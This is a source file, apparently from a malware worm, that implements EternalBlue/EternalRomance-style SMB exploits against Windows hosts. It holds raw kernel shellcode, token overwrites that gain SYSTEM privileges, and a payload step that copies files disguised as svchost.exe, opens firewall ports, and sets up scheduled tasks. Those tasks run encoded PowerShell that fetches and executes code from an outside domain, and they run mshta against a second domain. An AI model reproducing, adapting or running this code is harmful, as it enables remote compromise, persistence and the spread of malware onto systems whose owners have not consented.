    fakeUserAndGroupsAddr = userAndGroupsAddr
    addr = fakeUserAndGroupsAddr + fakeUserAndGroupCount * info['PTR_SIZE'] * 2
    fakeUserAndGroups = ''
    for sid, attr in zip(sids[:fakeUserAndGroupCount], attrs[:fakeUserAndGroupCount]):
        fakeUserAndGroups += pack('<' + info['PTR_FMT'] * 2, addr, attr)
        addr += len(sid)

    fakeUserAndGroups += ''.join(sids[:fakeUserAndGroupCount])
    return (fakeUserAndGroupCount, fakeUserAndGroups)


def exploit(target, pipe_name, USERNAME, PASSWORD, tg):
    conn = MYSMB(target)
    conn.get_socket().setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    info = {}
    conn.login(USERNAME, PASSWORD, maxBufferSize=4356)
    server_os = conn.get_server_os()
    print('Target OS: ' + server_os)
    if server_os.startswith('Windows 7 ') or server_os.startswith('Windows Server 2008 R2'):
        info['os'] = 'WIN7'
        info['method'] = exploit_matched_pairs
    elif server_os.startswith('Windows 8') or server_os.startswith('Windows Server 2012 ') or server_os.startswith('Windows Server 2016 ') or server_os.startswith('Windows 10') or server_os.startswith('Windows RT 9200'):
        info['os'] = 'WIN8'
        info['method'] = exploit_matched_pairs
    elif server_os.startswith('Windows Server (R) 2008') or server_os.startswith('Windows Vista'):
        info['os'] = 'WIN7'
        info['method'] = exploit_fish_barrel
    elif server_os.startswith('Windows Server 2003 '):
        info['os'] = 'WIN2K3'
        info['method'] = exploit_fish_barrel
    elif server_os.startswith('Windows 5.1'):
        info['os'] = 'WINXP'
        info['arch'] = 'x86'
        info['method'] = exploit_fish_barrel
    elif server_os.startswith('Windows XP '):
        info['os'] = 'WINXP'
        info['arch'] = 'x64'
        info['method'] = exploit_fish_barrel
    elif server_os.startswith('Windows 5.0'):
        info['os'] = 'WIN2K'
        info['arch'] = 'x86'
        info['method'] = exploit_fish_barrel
    else:
        print('This exploit does not support this target')
    if pipe_name is None:
        pipe_name = find_named_pipe(conn)
        if pipe_name is None:
            print('Not found accessible named pipe')
            return False
        print('Using named pipe: ' + pipe_name)
    if not info['method'](conn, pipe_name, info):
        return False
    fmt = info['PTR_FMT']
    print('make this SMB session to be SYSTEM')
    write_data(conn, info, info['session'] + info['SESSION_ISNULL_OFFSET'], '\x00\x01')
    sessionData = read_data(conn, info, info['session'], 256)
    secCtxAddr = unpack_from('<' + fmt, sessionData, info['SESSION_SECCTX_OFFSET'])[0]
    if 'PCTXTHANDLE_TOKEN_OFFSET' in info:
        if 'SECCTX_PCTXTHANDLE_OFFSET' in info:
            pctxtDataInfo = read_data(conn, info, secCtxAddr + info['SECCTX_PCTXTHANDLE_OFFSET'], 8)
            pctxtDataAddr = unpack_from('<' + fmt, pctxtDataInfo)[0]
        else:
            pctxtDataAddr = secCtxAddr
        tokenAddrInfo = read_data(conn, info, pctxtDataAddr + info['PCTXTHANDLE_TOKEN_OFFSET'], 8)
        tokenAddr = unpack_from('<' + fmt, tokenAddrInfo)[0]
        print('current TOKEN addr: 0x{:x}'.format(tokenAddr))
        tokenData = read_data(conn, info, tokenAddr, 64 * info['PTR_SIZE'])
        userAndGroupsAddr, userAndGroupCount, userAndGroupsAddrOffset, userAndGroupCountOffset = get_group_data_from_token(info, tokenData)
        print('overwriting token UserAndGroups')
        fakeUserAndGroupCount, fakeUserAndGroups = create_fake_SYSTEM_UserAndGroups(conn, info, userAndGroupCount, userAndGroupsAddr)
        if fakeUserAndGroupCount != userAndGroupCount:
            write_data(conn, info, tokenAddr + userAndGroupCountOffset, pack('<I', fakeUserAndGroupCount))
        write_data(conn, info, userAndGroupsAddr, fakeUserAndGroups)
    else:
        secCtxData = read_data(conn, info, secCtxAddr, info['SECCTX_SIZE'])
        print('overwriting session security context')
        write_data(conn, info, secCtxAddr, info['FAKE_SECCTX'])
    try:
        smb_pwn(conn, info['arch'], tg)
    except:
        pass

    if 'PCTXTHANDLE_TOKEN_OFFSET' in info:
        userAndGroupsOffset = userAndGroupsAddr - tokenAddr
        write_data(conn, info, userAndGroupsAddr, tokenData[userAndGroupsOffset:userAndGroupsOffset + len(fakeUserAndGroups)])
        if fakeUserAndGroupCount != userAndGroupCount:
            write_data(conn, info, tokenAddr + userAndGroupCountOffset, pack('<I', userAndGroupCount))
    else:
        write_data(conn, info, secCtxAddr, secCtxData)
    conn.disconnect_tree(conn.get_tid())
    conn.logoff()
    conn.get_socket().close()
    time.sleep(2)
    return True


def validate_token_offset(info, tokenData, userAndGroupCountOffset, userAndGroupsAddrOffset):
    userAndGroupCount, RestrictedSidCount = unpack_from('<II', tokenData, userAndGroupCountOffset)
    userAndGroupsAddr, RestrictedSids = unpack_from('<' + info['PTR_FMT'] * 2, tokenData, userAndGroupsAddrOffset)
    success = True
    if RestrictedSidCount != 0 or RestrictedSids != 0 or userAndGroupCount == 0 or userAndGroupsAddr == 0:
        print('Bad TOKEN_USER_GROUP offsets detected while parsing tokenData!')
        print('RestrictedSids: 0x{:x}'.format(RestrictedSids))
        print('RestrictedSidCount: 0x{:x}'.format(RestrictedSidCount))
        success = False
    print('userAndGroupCount: 0x{:x}'.format(userAndGroupCount))
    print('userAndGroupsAddr: 0x{:x}'.format(userAndGroupsAddr))
    return (success, userAndGroupCount, userAndGroupsAddr)


def get_group_data_from_token(info, tokenData):
    userAndGroupCountOffset = info['TOKEN_USER_GROUP_CNT_OFFSET']
    userAndGroupsAddrOffset = info['TOKEN_USER_GROUP_ADDR_OFFSET']
    success, userAndGroupCount, userAndGroupsAddr = validate_token_offset(info, tokenData, userAndGroupCountOffset, userAndGroupsAddrOffset)
    if not success and info['os'] == 'WINXP' and info['arch'] == 'x86':
        print('Attempting WINXP SP0/SP1 x86 TOKEN_USER_GROUP workaround')
        userAndGroupCountOffset = info['TOKEN_USER_GROUP_CNT_OFFSET_SP0_SP1']
        userAndGroupsAddrOffset = info['TOKEN_USER_GROUP_ADDR_OFFSET_SP0_SP1']
        success, userAndGroupCount, userAndGroupsAddr = validate_token_offset(info, tokenData, userAndGroupCountOffset, userAndGroupsAddrOffset)
    if not success:
        print('Bad TOKEN_USER_GROUP offsets. Abort > BSOD')
    return (userAndGroupsAddr,
     userAndGroupCount,
     userAndGroupsAddrOffset,
     userAndGroupCountOffset)


def smb_pwn(conn, arch, tg):
    ee = ''
    eb = 'c:\\windows\\system32\\calc.exe'
    smbConn = conn.get_smbconnection()
    if os.path.exists('c:/windows/system32/svhost.exe'):
        eb = 'c:\\windows\\system32\\svhost.exe'
    if os.path.exists('c:/windows/SysWOW64/svhost.exe'):
        eb = 'c:\\windows\\SysWOW64\\svhost.exe'
    if os.path.exists('c:/windows/system32/drivers/svchost.exe'):
        eb = 'c:\\windows\\system32\\drivers\\svchost.exe'
    if os.path.exists('c:/windows/SysWOW64/drivers/svchost.exe'):
        eb = 'c:\\windows\\SysWOW64\\drivers\\svchost.exe'
    service_exec(conn, 'cmd /c net share c$=c:')
    if tg == 2:
        smb_send_file(smbConn, eb, 'c', '/installed2.exe')
    else:
        smb_send_file(smbConn, eb, 'c', '/installed.exe')
    if os.path.exists('c:/windows/temp/svvhost.exe'):
        ee = 'c:\\windows\\temp\\svvhost.exe'
    if os.path.exists('c:/windows/temp/svchost.exe'):
        ee = 'c:\\windows\\temp\\svchost.exe'
    if '.exe' in ee:
        smb_send_file(smbConn, ee, 'c', '/windows/temp/svchost.exe')
    else:
        print('no eb**************************')
    if tg == 2:
        bat = 'cmd /c c:\\installed2.exe&c:\\installed2.exe&echo c:\\installed2.exe >c:/windows/temp/p.bat&echo c:\\windows\\temp\\svchost.exe >>c:/windows/temp/p.bat&echo netsh interface ipv6 install >>c:/windows/temp/p.bat &echo netsh firewall add portopening tcp 65532 DNS2  >>c:/windows/temp/p.bat&echo netsh interface portproxy add v4tov4 listenport=65532 connectaddress=1.1.1.1 connectport=53 >>c:/windows/temp/p.bat&echo netsh firewall add portopening tcp 65531 DNSS2  >>c:/windows/temp/p.bat&echo netsh interface portproxy add v4tov4 listenport=65531 connectaddress=1.1.1.1 connectport=53 >>c:/windows/temp/p.bat&echo if exist C:/windows/system32/WindowsPowerShell/ (schtasks /create /ru system /sc MINUTE /mo 50 /st 07:00:00 /tn "\\Microsoft\\windows\\Bluetooths" /tr "powershell -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgAuAGIAZQBhAGgAaAAuAGMAbwBtAC8AdgAnACsAJABlAG4AdgA6AFUAUwBFAFIARABPAE0AQQBJAE4AKQA=" /F) else start /b sc start Schedule^&ping localhost^&sc query Schedule^|findstr RUNNING^&^&^(schtasks /delete /TN Autocheck /f^&schtasks /create /ru system /sc MINUTE /mo 50 /ST 07:00:00 /TN Autocheck /tr "cmd.exe /c mshta http://w.beahh.com/page.html?p%COMPUTERNAME%"^&schtasks /run /TN Autocheck^) >>c:/windows/temp/p.bat&echo net start Ddriver >>c:/windows/temp/p.bat&echo for /f  %%i in (\'tasklist ^^^| find /c /i "cmd.exe"\'^) do set s=%%i >>c:/windows/temp/p.bat&echo if %s% gtr 10 (shutdown /r) >>c:/windows/temp/p.bat&echo net user k8h3d /del >>c:/windows/temp/p.bat&echo del c:\\windows\\temp\\p.bat>>c:/windows/temp/p.bat&cmd.exe /c c:/windows/temp/p.bat'
    else:
        bat = 'cmd /c c:\\installed.exe&c:\\installed.exe&echo c:\\installed.exe >c:/windows/temp/p.bat&echo c:\\windows\\temp\\svchost.exe >>c:/windows/temp/p.bat&echo netsh interface ipv6 install >>c:/windows/temp/p.bat &echo netsh firewall add portopening tcp 65532 DNS2  >>c:/windows/temp/p.bat&echo netsh interface portproxy add v4tov4 listenport=65532 connectaddress=1.1.1.1 connectport=53 >>c:/windows/temp/p.bat&echo netsh firewall add portopening tcp 65531 DNSS2  >>c:/windows/temp/p.bat&echo netsh interface portproxy add v4tov4 listenport=65531 connectaddress=1.1.1.1 connectport=53 >>c:/windows/temp/p.bat&echo if exist C:/windows/system32/WindowsPowerShell/ (schtasks /create /ru system /sc MINUTE /mo 50 /st 07:00:00 /tn "\\Microsoft\\windows\\Bluetooths" /tr "powershell -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgAuAGIAZQBhAGgAaAAuAGMAbwBtAC8AdgAnACsAJABlAG4AdgA6AFUAUwBFAFIARABPAE0AQQBJAE4AKQA=" /F) else start /b sc start Schedule^&ping localhost^&sc query Schedule^|findstr RUNNING^&^&^(schtasks /delete /TN Autocheck /f^&schtasks /create /ru system /sc MINUTE /mo 50 /ST 07:00:00 /TN Autocheck /tr "cmd.exe /c mshta http://w.beahh.com/page.html?p%COMPUTERNAME%"^&schtasks /run /TN Autocheck^) >>c:/windows/temp/p.bat&echo net start Ddriver >>c:/windows/temp/p.bat&echo for /f  %%i in (\'tasklist ^^^| find /c /i "cmd.exe"\'^) do set s=%%i >>c:/windows/temp/p.bat&echo if %s% gtr 10 (shutdown /r) >>c:/windows/temp/p.bat&echo net user k8h3d /del >>c:/windows/temp/p.bat&echo del c:\\windows\\temp\\p.bat>>c:/windows/temp/p.bat&cmd.exe /c c:/windows/temp/p.bat'
    service_exec(conn, bat)


def smb_send_file(smbConn, localSrc, remoteDrive, remotePath):
    with open(localSrc, 'rb') as fp:
        smbConn.putFile(remoteDrive + '$', remotePath, fp.read)


def service_exec(conn, cmd):
    import random
    random.choice = random.choice
    random.randint = random.randint
    import string
    from impacket.dcerpc.v5 import transport, srvs, scmr
    service_name = ''.join([ random.choice(string.letters) for i in range(4) ])
    rpcsvc = conn.get_dce_rpc('svcctl')
    rpcsvc.connect()
    rpcsvc.bind(scmr.MSRPC_UUID_SCMR)
    svcHandle = None
    try:
        print('Opening SVCManager on %s.....' % conn.get_remote_host())
        resp = scmr.hROpenSCManagerW(rpcsvc)
        svcHandle = resp['lpScHandle']
        try:
            resp = scmr.hROpenServiceW(rpcsvc, svcHandle, service_name + '\x00')
        except Exception as e:
            if str(e).find('ERROR_SERVICE_DOES_NOT_EXIST') == -1:
                raise e
        else:
            scmr.hRDeleteService(rpcsvc, resp['lpServiceHandle'])
            scmr.hRCloseServiceHandle(rpcsvc, resp['lpServiceHandle'])

        print('Creating service %s.....' % service_name)
        resp = scmr.hRCreateServiceW(rpcsvc, svcHandle, service_name + '\x00', service_name + '\x00', lpBinaryPathName=cmd + '\x00')
        serviceHandle = resp['lpServiceHandle']
        if serviceHandle:
            try:
                print('Starting service %s.....' % service_name)
                scmr.hRStartServiceW(rpcsvc, serviceHandle)
                time.sleep(2)
                print('Stoping service %s.....' % service_name)
                scmr.hRControlService(rpcsvc, serviceHandle, scmr.SERVICE_CONTROL_STOP)
                time.sleep(2)
            except Exception as e:
                print(str(e))

            print('Removing service %s.....' % service_name)
            scmr.hRDeleteService(rpcsvc, serviceHandle)
            scmr.hRCloseServiceHandle(rpcsvc, serviceHandle)
    except Exception as e:
        print('ServiceExec Error on: %s' % conn.get_remote_host())
        print(str(e))
    finally:
        if svcHandle:
            scmr.hRCloseServiceHandle(rpcsvc, svcHandle)

    rpcsvc.disconnect()


scode = '31c0400f84be03000060e8000000005be823000000b9760100000f328d7b3c39f87411394500740689450089550889f831d20f3061c224008dab00100000c1ed0cc1e50c81ed50000000c3b92300000068300000000fa18ed98ec1648b0d400000008b6104519c60e8000000005be8c5ffffff8b450005170000008944242431c09942f00fb055087512b976010000998b45000f30fbe804000000fa619dc38b4500c1e80cc1e00c2d001000006681384d5a75f4894504b8787cf4dbe8e100000097b83f5f647757e8d500000029f889c13d70010000750505080000008d581c8d341f64a1240100008b3689f229c281fa0004000077f252b8e1140117e8a70000008b400a8d50048d340fe8d70000003d5a6afac174113dd883e03e740a8b3c1729d7e9e0ffffff897d0c8d1c1f8d75105f8b5b04b83e4cf8cee86a0000008b400a3ca077022c0829f8817c03fc0000000074de31c05568010000005550e800000000810424950000005053293c2456b8c45c196de82800000031c050505056b83446ccafe81800000085c074a48b451c80780e01740a8900894004e991ffffffc3e802000000ffe0608b6d04978b453c8b54057801ea8b4a188b5a2001eb498b348b01eee81d00000039f875f18b5a2401eb668b0c4b8b5a1c01eb8b048b01e88944241c61c35231c099acc1ca0d01c285c075f6925ac358894424105859585a6052518b2831c064a22400000099b04050c1e0065054528911514a52b8ea996e57e87bffffff85c07553588b38e8000000005e81c659000000b900040000f3a48b450c50b848b818b8e853ffffff8b400c8b40148b0066817824180075f68b5028817a0c3300320075ea8b5810895d04b85e515e83e82effffff59890131c08845084064a22400000061c35a585859515151e8000000008104240c000000515152ffe0dadeba67042d06d97424f45d31c9b14383c504315513033217cff340ff8dfcb800f2755d3132e1166282617a8f69276e041fe081adaad6ac2e862bafacd57f0f8c15724ec9487f028207d2b2a752ef39fb7377de4c755671c62c78700b45316a48608b01ba1e0ac3f2dfa12a3b12bb6bfccdce85fe70c9527caf5c402624c6acd6e99127d446d56ff9593a0405d1bdca8fa199ced4728357b1d5bc871a8918ccb7de108fdd21a6aa9022b8b4844a893f4b0c16ea2ff2f43e5a9ba0abe7c652062bffd0a2d404c8c7d1414e34a8da3b3a1fda6959f240b2b26fa9dca91b89554281bbb5cf7154856ba2cfd11791651b84bf1f081d60cfcf0504297ea0b01512455a3786feeed823702f46a81d46e659aeec84f824621b88e417e306d78333f87628500655e82e000000b9820000c00f324c8d0d370000004439c87419394500740a895504894500c645f8004991505a48c1ea200f305dc3488d2d0010000048c1ed0c48c1e50c4881ed70000000c30f01f865488924251000000065488b2425a8010000682b00000065ff342510000000505055e8bfffffff488b450048051f00000048894424105152415041514152415331c0b201f00fb055f87514b9820000c08b45008b55040f30fbe80e000000fa415b415a415941585a595d58c341574156575653504c8b7d0049c1ef0c49c1e70c4981ef001000006641813f4d5a75f14c897d08654c8b342588010000bf787cf4dbe8180100004891bf3f5f6477e8130100008b400389c33d0004000072050510000000488d50284c8d04114d89c14d8b094d39c80f84db0000004c89c84c29f0483d0007000077e64d29cebfe1140117e8d00000008b780381c708000000488d3419e8060100003d5a6afac174133dd883e03e740c488b0c394829f9e9ddffffffbf48b818b8e893000000488945f0488d34114889f3488b5b084839de74f74a8d1433bf3e4cf8cee8780000008b400348817c02f80000000074db488d4d104d31c04c8d0db50000005568010000005541504881ec20000000bfc45c196de83b000000488d4d104d31c9bf3446ccafe82a0000004881c44000000085c07497488b452080781a01740c48890048894008e981ffffff585b5e5f415e415fc3e802000000ffe0535156418b473c418b8407880000004c01f8508b48188b58204c01fbffc98b348b4c01fee81f00000039f875ef588b58244c01fb668b0c4b8b581c4c01fb8b048b4c01f85e595bc35231c099acc1ca0d01c285c075f6925ac3555357564157498b284c8b7d08525e4c89cb31c0440f22c048890289c148f7d14989c0b04050c1e006504989014881ec20000000bfea996e57e862ffffff4881c43000000085c07546488b3e488d354e000000b900060000f3a4488b45f0488b4018488b4020488b0066817848180075f5488b5050817a0c3300320075e84c8b7820bf5e515e83e81bffffff48890331c9884df8b101440f22c1415f5e5f5b5dc3489231c951514989c94c8d051300000089ca4881ec20000000ffd04881c430000000c3dac4d97424f4be15624e335f33c9b15731771a83c704037716e2e09e06b0eeaf7f76ee4f8036bf0ed0ea6ec7983b428250b7302d294ce6b5e1d954e6b9562ab671667d7cc835b04884f472e629960ef57d78af38b4756eba86649dee49381584189a2ed8a092310d53a2b9ad64a3f128a4d7667b24c838f06ef0fc8d2f20b5907fc313db80cdda504a469467651b15a1c195959d9314dcd352961fd3b4ed6e683642b4797d63650ca5cbc16415c8807b467653f76a3f178c33a3de93639a6b970b556a484a3e2d3013e7f781f3565e435e11e3af7ee0b1d09fba74763a73fd9a53d4fe645c864821a2394855a5394855edb4c554ecc6d51754f75ef82f07b5bcd0e51fc951acf958ec4dfab647edc01164f7b46b140ca419114863f16bc101f5d25c5c2f1b8b3dbd8014ee5e693b95d449b62670f818a342946b57930fb4f3e0a5fda86c5cad79518f30e1f5e9dc8c81d54c210977e1dabf188c5460860af90926ba72bec45d00515bedc8c6a3793b7df4565a1990a8'
sc = binascii.unhexlify(scode)
NTFEA_SIZE = 69632
ntfea10000 = pack('<BBH', 0, 0, 65501) + 'A' * 65502
ntfea11000 = (pack('<BBH', 0, 0, 0) + '\x00') * 600
ntfea11000 += pack('<BBH', 0, 0, 62397) + 'A' * 62398
ntfea1f000 = (pack('<BBH', 0, 0, 0) + '\x00') * 9364
ntfea1f000 += pack('<BBH', 0, 0, 18669) + 'A' * 18670
ntfea = {65536: ntfea10000,
 69632: ntfea11000}
TARGET_HAL_HEAP_ADDR_x64 = 18446744073706405904L
TARGET_HAL_HEAP_ADDR_x86 = 4292866048L
fakeSrvNetBufferNsa = pack('<II', 69632, 0) * 2
fakeSrvNetBufferNsa += pack('<HHI', 65535, 0, 0) * 2
fakeSrvNetBufferNsa += '\x00' * 16
fakeSrvNetBufferNsa += pack('<IIII', TARGET_HAL_HEAP_ADDR_x86 + 256, 0, 0, TARGET_HAL_HEAP_ADDR_x86 + 32)
fakeSrvNetBufferNsa += pack('<IIHHI', TARGET_HAL_HEAP_ADDR_x86 + 256, 0, 96, 4100, 0)
fakeSrvNetBufferNsa += pack('<IIQ', TARGET_HAL_HEAP_ADDR_x86 - 128, 0, TARGET_HAL_HEAP_ADDR_x64)
fakeSrvNetBufferNsa += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64 + 256, 0)
fakeSrvNetBufferNsa += pack('<QHHI', 0, 96, 4100, 0)
fakeSrvNetBufferNsa += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64 - 128)
fakeSrvNetBufferX64 = pack('<II', 69632, 0) * 2
fakeSrvNetBufferX64 += pack('<HHIQ', 65535, 0, 0, 0)
fakeSrvNetBufferX64 += '\x00' * 16
fakeSrvNetBufferX64 += '\x00' * 16
fakeSrvNetBufferX64 += '\x00' * 16
fakeSrvNetBufferX64 += pack('<IIQ', 0, 0, TARGET_HAL_HEAP_ADDR_x64)
fakeSrvNetBufferX64 += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64 + 256, 0)
fakeSrvNetBufferX64 += pack('<QHHI', 0, 96, 4100, 0)
fakeSrvNetBufferX64 += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64 - 128)
fakeSrvNetBuffer = fakeSrvNetBufferNsa
feaList = pack('<I', 65536)
feaList += ntfea[NTFEA_SIZE]
feaList += pack('<BBH', 0, 0, len(fakeSrvNetBuffer) - 1) + fakeSrvNetBuffer
feaList += pack('<BBH', 18, 52, 22136)
fake_recv_struct = pack('<QII', 0, 3, 0)
fake_recv_struct += '\x00' * 16
fake_recv_struct += pack('<QII', 0, 3, 0)
fake_recv_struct += '\x00' * 16 * 7
fake_recv_struct += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64 + 160, TARGET_HAL_HEAP_ADDR_x64 + 160)
fake_recv_struct += '\x00' * 16
fake_recv_struct += pack('<IIQ', TARGET_HAL_HEAP_ADDR_x86 + 192, TARGET_HAL_HEAP_ADDR_x86 + 192, 0)
fake_recv_struct += '\x00' * 16 * 11
fake_recv_struct += pack('<QII', 0, 0, TARGET_HAL_HEAP_ADDR_x86 + 400)
fake_recv_struct += pack('<IIQ', 0, TARGET_HAL_HEAP_ADDR_x86 + 496 - 1, 0)
fake_recv_struct += '\x00' * 16 * 3
fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64 + 480)
fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64 + 496 - 1)

def getNTStatus(self):
    return self['ErrorCode'] << 16 | self['_reserved'] << 8 | self['ErrorClass']


setattr(smb.NewSMBPacket, 'getNTStatus', getNTStatus)

def sendEcho(conn, tid, data):
    pkt = smb.NewSMBPacket()
    pkt['Tid'] = tid
    transCommand = smb.SMBCommand(smb.SMB.SMB_COM_ECHO)
    transCommand['Parameters'] = smb.SMBEcho_Parameters()
    transCommand['Data'] = smb.SMBEcho_Data()
    transCommand['Parameters']['EchoCount'] = 1
    transCommand['Data']['Data'] = data
    pkt.addCommand(transCommand)
    conn.sendSMB(pkt)
    recvPkt = conn.recvSMB()
    if recvPkt.getNTStatus() == 0:
        print('got good ECHO response')
    else:
        print('got bad ECHO response: 0x{:x}'.format(recvPkt.getNTStatus()))


def createSessionAllocNonPaged(target, size):
    conn = smb.SMB(target, target)
    _, flags2 = conn.get_flags()
    flags2 &= ~smb.SMB.FLAGS2_EXTENDED_SECURITY
    if size >= 65535:
        flags2 &= ~smb.SMB.FLAGS2_UNICODE
        reqSize = size // 2
    else:
        flags2 |= smb.SMB.FLAGS2_UNICODE
        reqSize = size
    conn.set_flags(flags2=flags2)
    pkt = smb.NewSMBPacket()
    sessionSetup = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
    sessionSetup['Parameters'] = smb.SMBSessionSetupAndX_Extended_Parameters()
    sessionSetup['Parameters']['MaxBufferSize'] = 61440
    sessionSetup['Parameters']['MaxMpxCount'] = 2
    sessionSetup['Parameters']['VcNumber'] = 2
    sessionSetup['Parameters']['SessionKey'] = 0
    sessionSetup['Parameters']['SecurityBlobLength'] = 0
    sessionSetup['Parameters']['Capabilities'] = smb.SMB.CAP_EXTENDED_SECURITY
    sessionSetup['Data'] = pack('<H', reqSize) + '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    pkt.addCommand(sessionSetup)
    conn.sendSMB(pkt)
    recvPkt = conn.recvSMB()
    if recvPkt.getNTStatus() == 0:
        print('SMB1 session setup allocate nonpaged pool success')
    else:
        print('SMB1 session setup allocate nonpaged pool failed')
    return conn


class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
    structure = (('TotalParameterCount', '<H=0'),
     ('TotalDataCount', '<H'),
     ('ParameterCount', '<H=0'),
     ('ParameterOffset', '<H=0'),
     ('ParameterDisplacement', '<H=0'),
     ('DataCount', '<H'),
     ('DataOffset', '<H'),
     ('DataDisplacement', '<H=0'),
     ('FID', '<H=0'))


def send_trans2_second(conn, tid, data, displacement):
    pkt = smb.NewSMBPacket()
    pkt['Tid'] = tid
    transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
    transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
    transCommand['Data'] = smb.SMBTransaction2Secondary_Data()
    transCommand['Parameters']['TotalParameterCount'] = 0
    transCommand['Parameters']['TotalDataCount'] = len(data)
    fixedOffset = 53
    transCommand['Data']['Pad1'] = ''
    transCommand['Parameters']['ParameterCount'] = 0
    transCommand['Parameters']['ParameterOffset'] = 0
    if len(data) > 0:
        pad2Len = (4 - fixedOffset % 4) % 4
        transCommand['Data']['Pad2'] = '\xff' * pad2Len
    else:
        transCommand['Data']['Pad2'] = ''
        pad2Len = 0
    transCommand['Parameters']['DataCount'] = len(data)
    transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
    transCommand['Parameters']['DataDisplacement'] = displacement
    transCommand['Data']['Trans_Parameters'] = ''
    transCommand['Data']['Trans_Data'] = data
    pkt.addCommand(transCommand)
    conn.sendSMB(pkt)


def send_big_trans2(conn, tid, setup, data, param, firstDataFragmentSize, sendLastChunk = True):
    pkt = smb.NewSMBPacket()
    pkt['Tid'] = tid
    command = pack('<H', setup)
    transCommand = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)
    transCommand['Parameters'] = smb.SMBNTTransaction_Parameters()
    transCommand['Parameters']['MaxSetupCount'] = 1
    transCommand['Parameters']['MaxParameterCount'] = len(param)
    transCommand['Parameters']['MaxDataCount'] = 0
    transCommand['Data'] = smb.SMBTransaction2_Data()
    transCommand['Parameters']['Setup'] = command
    transCommand['Parameters']['TotalParameterCount'] = len(param)
    transCommand['Parameters']['TotalDataCount'] = len(data)
    fixedOffset = 73 + len(command)
    if len(param) > 0:
        padLen = (4 - fixedOffset % 4) % 4
        padBytes = '\xff' * padLen
        transCommand['Data']['Pad1'] = padBytes
    else:
        transCommand['Data']['Pad1'] = ''
        padLen = 0
    transCommand['Parameters']['ParameterCount'] = len(param)
    transCommand['Parameters']['ParameterOffset'] = fixedOffset + padLen
    if len(data) > 0:
        pad2Len = (4 - (fixedOffset + padLen + len(param)) % 4) % 4
        transCommand['Data']['Pad2'] = '\xff' * pad2Len
    else:
        transCommand['Data']['Pad2'] = ''
        pad2Len = 0
    transCommand['Parameters']['DataCount'] = firstDataFragmentSize
    transCommand['Parameters']['DataOffset'] = transCommand['Parameters']['ParameterOffset'] + len(param) + pad2Len
    transCommand['Data']['Trans_Parameters'] = param
    transCommand['Data']['Trans_Data'] = data[:firstDataFragmentSize]
    pkt.addCommand(transCommand)
    conn.sendSMB(pkt)
    conn.recvSMB()
    i = firstDataFragmentSize
    while i < len(data):
        sendSize = min(4096, len(data) - i)
        if len(data) - i <= 4096:
            if not sendLastChunk:
                break
        send_trans2_second(conn, tid, data[i:i + sendSize], i)
        i += sendSize

    if sendLastChunk:
        conn.recvSMB()
    return i


def createConnectionWithBigSMBFirst80(target):
    sk = socket.create_connection((target, 445))
    pkt = '\x00\x00' + pack('>H', 65527)
    pkt += 'BAAD'
    pkt += '\x00' * 124
    sk.send(pkt)
    return sk


lock2 = threading.Lock()

def exploit2(target, shellcode, numGroomConn):
    global lock2
    lock2.acquire()
    conn = smb.SMB(target, target)
    conn.login_standard('', '')
    server_os = conn.get_server_os()
    print('Target OS: ' + server_os)
    if not (server_os.startswith('Windows 7 ') or server_os.startswith('Windows Server ') and ' 2008 ' in server_os or server_os.startswith('Windows Vista')):
        print('This exploit does not support this target')
    tid = conn.tree_connect_andx('\\\\' + target + '\\' + 'IPC$')
    progress = send_big_trans2(conn, tid, 0, feaList, '\x00' * 30, 2000, False)
    allocConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 4112)
    srvnetConn = []
    for i in range(numGroomConn):
        sk = createConnectionWithBigSMBFirst80(target)
        srvnetConn.append(sk)

    holeConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 16)
    allocConn.get_socket().close()
    for i in range(5):
        sk = createConnectionWithBigSMBFirst80(target)
        srvnetConn.append(sk)

    holeConn.get_socket().close()
    send_trans2_second(conn, tid, feaList[progress:], progress)
    recvPkt = conn.recvSMB()
    retStatus = recvPkt.getNTStatus()
    if retStatus == 3221225485L:
        print('good response status: INVALID_PARAMETER')
    else:
        print('bad response status: 0x{:08x}'.format(retStatus))
    for sk in srvnetConn:
        sk.send(fake_recv_struct + shellcode)

    for sk in srvnetConn:
        sk.close()

    conn.disconnect_tree(tid)
    conn.logoff()
    conn.get_socket().close()
    time.sleep(2)
    lock2.release()


lock3 = threading.Lock()

def exploit3(target, shellcode, numGroomConn1):
    global lock3
    lock3.acquire()
    conn3 = smb.SMB(target, target)
    conn3.login_standard('', '')
    server_os3 = conn3.get_server_os()
    print('Target OS: ' + server_os3)
    if not (server_os3.startswith('Windows 7 ') or server_os3.startswith('Windows Server ') and ' 2008 ' in server_os3 or server_os3.startswith('Windows Vista')):
        print('This exploit does not support this target')
    tid3 = conn3.tree_connect_andx('\\\\' + target + '\\' + 'IPC$')
    progress3 = send_big_trans2(conn3, tid3, 0, feaList, '\x00' * 30, 2000, False)
    allocConn3 = createSessionAllocNonPaged(target, NTFEA_SIZE - 4112)
    srvnetConn3 = []
    for i in range(numGroomConn1):
        sk3 = createConnectionWithBigSMBFirst80(target)
